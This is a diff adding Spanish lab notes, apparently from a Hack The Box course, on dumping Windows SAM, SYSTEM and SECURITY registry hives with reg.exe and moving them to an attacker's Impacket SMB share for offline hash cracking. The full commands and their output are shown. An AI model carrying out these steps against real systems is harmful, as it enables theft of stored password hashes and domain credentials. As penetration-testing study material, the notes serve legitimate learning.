@@ -198,3 +198,68 @@ Asm0o@htb[/htb]$ creds search linksys
 | linksys (ssh) |      root     |   admin    |
 +---------------+---------------+------------+
 ```
+
+## Ataques SAM, SYSTEM y SECURITY
+
+Con acceso administrativo a un sistema windows, podemos intentar dumpear rápidamente los archivos asociados con la base de datos SAM, transferir los a nuestro host atacante y comenzar a crackear hashes fuera de linea.
+
+## Colmenas de registro
+
+Hay 3 colmenas de registro que pueden ser copias si tenemos acceso administrativo local a un sistema objetivo.
+
+| Registry Hive   | Description                                                                                                                                                                                                 |
+| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `HKLM\SAM`      | Contiene hashes de contraseñas de cuentas de usuario locales. Estos hashes se pueden extraer y descifrar para revelar contraseñas en texto plano.                                                           |
+| `HKLM\SYSTEM`   | Almacena la clave de arranque del sistema, que se utiliza para cifrar la base de datos SAM. Esta clave es necesaria para descifrar los hashes.                                                              |
+| `HKLM\SECURITY` | Contiene información confidencial utilizada por la Autoridad de Seguridad Local (LSA), incluidas credenciales de dominio almacenadas en caché (DCC2), contraseñas de texto sin formato, claves DPAPI y más. |
+
+## Usar reg.exe para copiar colmenas de registro
+
+Al lanzar cmd.exe con privilegios administrativos, podemos usar reg.exe para salvar copias de los registros colmenas
+
+```shell
+C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
+
+The operation completed successfully.
+
+C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
+
+The operation completed successfully.
+
+C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
+
+The operation completed successfully.
+```
+
+## Creando un recurso compartido con smbserver
+
+Para crear un recurso compartido,  simplemente corremos smbserver.py  -smb2support, especifica el nombre del recurso compartido (CompData), y señalar directorio local  en nuestro host atacante donde la copia de la colmena será almacenada.
+
+```shell
+Asm0o@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+Una vez recurso esta corriendo en nuestro host atacante, podemos usar el comando move en el objetivo windows para transferir las copias colmenas al recurso.
+
+## Moviendo copias colmenas al archivo compartido
+
+```shell
+C:\> move sam.save \\10.10.15.16\CompData
+        1 file(s) moved.
+
+C:\> move security.save \\10.10.15.16\CompData
+        1 file(s) moved.
+
+C:\> move system.save \\10.10.15.16\CompData
+        1 file(s) moved.
+```
+
